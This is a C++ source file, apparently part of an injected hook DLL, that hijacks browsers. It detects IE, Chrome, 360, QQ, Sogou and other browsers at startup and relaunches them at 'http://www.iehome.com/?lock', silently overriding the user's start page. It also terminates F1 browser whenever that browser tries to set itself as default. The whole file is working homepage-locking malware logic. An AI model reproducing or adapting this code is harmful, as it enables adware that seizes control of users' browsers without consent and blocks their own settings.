#include "HTTPRedirect.h"

#include "FakeCommandLine.h"

#include "HookControl\HookHelp.h"
#include "HookControl\InlineHook.h"
#include "HookControl\IATHook.h"

namespace {
#define _W(_str)		L##_str
	const wchar_t * ptszHitProcessNameLists[] = {
		_W("iexplore.exe")/* IE 核心浏览器*/,

		_W("360se.exe")/* 360安全 核心浏览器*/,
		_W("360chrome.exe")/* 360极速 核心浏览器*/,
		_W("chrome.exe")/* Chrome 核心浏览器*/,
		_W("qqbrowser.exe")/* QQ 核心浏览器*/,
		_W("sogouexplorer.exe")/* 搜狗 核心浏览器*/,
		_W("baidubrowser.exe")/* 百度 核心浏览器*/,
		_W("f1browser.exe")/* F1 核心浏览器*/,
		_W("2345explorer.exe")/* 2345 核心浏览器*/,

		_W("yidian.exe")/* 一点浏览器 湖南岳阳 应该是当地实名制公司的*/
	};
	const wchar_t * ptszHitRedirectURLLists[] = {
		_W("0.baidu.com/?"),
		_W("www.baidu.com/?"),
		_W("www.baidu.com/home?"),
		_W("www.baidu.com/index.php?")
		_W("www.sogou.com/index"),
		_W("www.hao123.com/?"),
		_W("www.2345.com/?"),
		_W("hao.360.cn/?"),
		_W("123.sogou.com/?"),

		_W(".index66.com")
	};
	const wchar_t * wcsistr(const wchar_t* pString, const wchar_t* pFind)
	{
		wchar_t* char1 = NULL;
		wchar_t* char2 = NULL;
		if ((pString == NULL) || (pFind == NULL) || (wcslen(pString) < wcslen(pFind)))
		{
			return NULL;
		}

		for (char1 = (wchar_t*)pString; (*char1) != L'\0'; ++char1)
		{
			wchar_t* char3 = char1;
			for (char2 = (wchar_t*)pFind; (*char2) != L'\0' && (*char1) != L'\0'; ++char2, ++char1)
			{
				wchar_t c1 = (*char1) & 0xDF;
				wchar_t c2 = (*char2) & 0xDF;
				if ((c1 != c2) || (((c1 > 0x5A) || (c1 < 0x41)) && (*char1 != *char2))) // 此处重新编辑了下
					break;
			}

			if ((*char2) == L'\0')
				return char3;

			char1 = char3;
		}

		return NULL;
	}
	typedef LONG(WINAPI *PNTQUERYINFORMATIONPROCESS)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

	inline PPEB GetCurrentProcessPEB()
	{
		return PPEB(__readfsdword(0x30));
	}

	int GetParentProcessId(DWORD dwProcessId)
	{
		LONG                      status = 0;
		DWORD                     dwParentPID = 0;
		PROCESS_BASIC_INFORMATION pbi = {0};

		PNTQUERYINFORMATIONPROCESS NtQueryInformationProcess = (PNTQUERYINFORMATIONPROCESS)GetProcAddress(GetModuleHandle("ntdll"), "NtQueryInformationProcess");
		
		if (!NtQueryInformationProcess)
			return -1;

		HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwProcessId);

		if (NULL == hProcess) {
			return -1;
		}

		if (NT_SUCCESS(NtQueryInformationProcess(hProcess, ProcessBasicInformation, (PVOID)&pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL))) {
			dwParentPID = (DWORD)pbi.Reserved3;//InheritedFromUniqueProcessId
		}

		CloseHandle(hProcess);

		return dwParentPID;
	}

	LPCWSTR GetProcessNameByProcessId(DWORD dwProcessID)
	{
		PROCESSENTRY32W pe32 = { 0 };
		LPCWSTR pcwszProcessName = NULL;
		HANDLE hProcessSnap = INVALID_HANDLE_VALUE;

		hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

		pe32.dwSize = sizeof(PROCESSENTRY32W);

		if (!Process32FirstW(hProcessSnap, &pe32))
			return NULL;

		do
		{
			if (pe32.th32ProcessID == dwProcessID)
			{
				pcwszProcessName = pe32.szExeFile;
				break;
			}

			pe32.dwSize = sizeof(PROCESSENTRY32W);
		} while (Process32NextW(hProcessSnap, &pe32));

		CloseHandle(hProcessSnap);

		return pcwszProcessName;
	}

	bool RegRead(HKEY hRootKey, LPCWSTR lpSubKey, LPCWSTR lpValueName, BYTE   * pBuffer, size_t sizeBufferSize)
	{
		HKEY hKey;
		bool bIsOK = false;
		DWORD dwType = 0;
		DWORD dwBufferSize = sizeBufferSize;

		if (RegOpenKeyW(hRootKey, lpSubKey, &hKey) != ERROR_SUCCESS)
			return   false;

		if (RegQueryValueExW(hKey, lpValueName, NULL, &dwType, (LPBYTE)pBuffer, &dwBufferSize) == ERROR_SUCCESS) {//   成功 
			bIsOK = true;
		}

		RegCloseKey(hKey);

		return   bIsOK;
	}

	bool FindRedirectURL(const wchar_t * pcwszCheckString) {
		for (int i = 0; i < count(ptszHitRedirectURLLists); i++) {
			if (NULL != wcsistr(pcwszCheckString, ptszHitRedirectURLLists[i])) {
				return true;
			}
		}

		return false;
	}

	bool GetUrlAssociationbyProtocol(const wchar_t * pcwszProtocolName, wchar_t * pwszProtocolCommandLine, size_t sizeBufferSize = 2048) {
		WCHAR wszOpenSubKey[MAX_PATH + 1] = { 0 };

		_swprintf(wszOpenSubKey, L"Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\%s\\UserChoice", pcwszProtocolName);

		if (false == RegRead(HKEY_CURRENT_USER, wszOpenSubKey, L"Progid", (BYTE *)pwszProtocolCommandLine, sizeBufferSize)
			&& false == RegRead(HKEY_LOCAL_MACHINE, wszOpenSubKey, L"Progid", (BYTE *)pwszProtocolCommandLine, sizeBufferSize)) {
			pwszProtocolCommandLine[0] = L'\0';
			return false;
		}

		_swprintf(wszOpenSubKey, L"Software\\Classes\\%s\\shell\\open\\command", pwszProtocolCommandLine);

		if (false == RegRead(HKEY_CURRENT_USER, wszOpenSubKey, NULL, (BYTE *)pwszProtocolCommandLine, sizeBufferSize)
			&& false == RegRead(HKEY_LOCAL_MACHINE, wszOpenSubKey, NULL, (BYTE *)pwszProtocolCommandLine, sizeBufferSize)) {
			pwszProtocolCommandLine[0] = L'\0';
			return false;
		}

		return true;
	}
}

bool Hook::StartCommandLineHook()
{
	PPEB pProcessPEB = GetCurrentProcessPEB();

	if (NULL == pProcessPEB || NULL == pProcessPEB->ProcessParameters) {
		return false;
	}

	LPCWSTR pcwszStartCommandLine = pProcessPEB->ProcessParameters->CommandLine.Buffer;
	LPCWSTR pcwszStartImagePathName = pProcessPEB->ProcessParameters->ImagePathName.Buffer;

	for (int i = 0; i < count(ptszHitProcessNameLists); i++) {
		if (NULL != wcsistr(pcwszStartImagePathName, ptszHitProcessNameLists[i])) {
			break;
		}

		pcwszStartImagePathName = NULL;
	}

	if (NULL == pcwszStartImagePathName || NULL == pcwszStartCommandLine) {
		return false;
	}

	DWORD dwParentProcessID = GetParentProcessId(GetCurrentProcessId());
	LPCWSTR pcwszParentProcessName = GetProcessNameByProcessId(dwParentProcessID);

	if (-1 == dwParentProcessID || NULL == pcwszParentProcessName) {
		return false;
	}

	if (NULL != wcsistr(pcwszStartImagePathName, pcwszParentProcessName)) {
		return false;
	}

	WCHAR wszProtocolCommandLine[1024 + 1] = { 0 };

	if (false == GetUrlAssociationbyProtocol(L"http", wszProtocolCommandLine, sizeof(wszProtocolCommandLine))) {
		return false;
	}

	LPCWSTR pcwszNewParameter = L"“http://www.iehome.com/?lock”";

	Global::Log.PrintW(LOGOutputs, L"[% 5u] HTTP Association: %s", GetCurrentProcessId(), wszProtocolCommandLine);
	Global::Log.PrintW(LOGOutputs, L"[% 5u] Start CommandLine: %s", GetCurrentProcessId(), pcwszStartCommandLine);

	bool bIsHit = FindRedirectURL(pcwszStartCommandLine);

	if (NULL != wcsistr(wszProtocolCommandLine, pcwszStartImagePathName)) {
		Global::Log.PrintW(LOGOutputs, L"[% 5u] HTTP Association Hit: %s", GetCurrentProcessId(), wszProtocolCommandLine);

		if (NULL == wcsistr(pcwszStartCommandLine, L"http")) {
			//			IsHit = true; // 由于使用此方法没办法辨别是否是启动默认浏览器,而 QQ空间等不是通过命令行打开而是通过协议打开的. 所以会误判
		}

		if (false == bIsHit) {
			pcwszNewParameter = NULL;
		}
	}

	///   编写代理状态监测

	////////////////////////////////////////////////////////////////////////////////////////////
	// 例外规则

	if (false == bIsHit && NULL != wcsistr(pcwszStartImagePathName, L"\\qqbrowser.exe")) {// QQ浏览器
		if (NULL != wcsistr(pcwszStartCommandLine, L"-fromqq")) { // QQ 触发的, 如打开空间等
			pcwszNewParameter = NULL;
		}

		if (NULL == wcsistr(pcwszStartCommandLine, L"http") && NULL == wcsistr(pcwszStartCommandLine, L"www.")) { // 只要不包含 URL 均不进行劫持
			pcwszNewParameter = NULL;
		}
	}

	if (false == bIsHit && NULL != wcsistr(pcwszStartImagePathName, L"\\f1browser.exe")) {// F1浏览器 
		if (NULL != wcsistr(pcwszStartCommandLine, L"set-default")) { // 禁止其设置默认浏览器
			Global::Log.PrintW(LOGOutputs, L"[% 5u] Terminated CommandLine Exec: %s", GetCurrentProcessId(), wszProtocolCommandLine);
			::ExitProcess(0);
			::TerminateProcess(::GetCurrentProcess(), 0);
		}
	}

	//////////////////////////////////////////////////////////////////////////////////////////////
	// 执行重定向

	if (NULL != pcwszNewParameter) {
		STARTUPINFOW siStratupInfo = { 0 };
		PROCESS_INFORMATION piProcessInformation = { 0 };

		_swprintf(wszProtocolCommandLine, L"\"%s\" %s", pcwszStartImagePathName, pcwszNewParameter);

		bool bIsSuccess = false;

		siStratupInfo.cb = sizeof(STARTUPINFO);

		if (FALSE == ::CreateProcessW(NULL, wszProtocolCommandLine, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &siStratupInfo, &piProcessInformation)) {
			return false;
		}

		ResumeThread(piProcessInformation.hThread);

		CloseHandle(piProcessInformation.hThread);
		CloseHandle(piProcessInformation.hProcess);

		::ExitProcess(0);
		::TerminateProcess(::GetCurrentProcess(), 0);
	}

	return true;
}
